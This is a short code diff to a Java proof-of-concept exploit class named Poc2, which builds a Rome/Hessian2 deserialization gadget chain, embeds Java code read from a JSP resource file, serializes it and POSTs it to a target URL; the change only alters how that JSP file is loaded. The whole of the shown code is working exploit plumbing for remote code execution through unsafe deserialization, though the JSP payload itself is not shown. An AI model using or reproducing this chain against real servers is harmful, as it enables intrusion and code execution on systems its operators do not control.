@@ -1,6 +1,7 @@
 import com.rometools.rome.feed.impl.EqualsBean;
 import com.rometools.rome.feed.impl.ToStringBean;
 import myframework.HttpRequest;
+import myframework.ReadWrite;
 import myframework.ser.Gadgets;
 import myframework.ser.Hessian2;
 
@@ -20,7 +21,8 @@ public class Poc2 {
         HttpRequest.post(url,ser);
     }
     public static Object poc() throws Exception{
-        String code = Eval.getJavaCodeFromJSP("1.jsp");
+        String code = new String(ReadWrite.readResource(Poc2.class,"1.jsp"));
+        code = Eval.getJavaCodeFromJSP(code);
         Object o = new Eval().getObject(RomeTools.class,code);
         byte[] ser = Serializer.serialize(o);
 
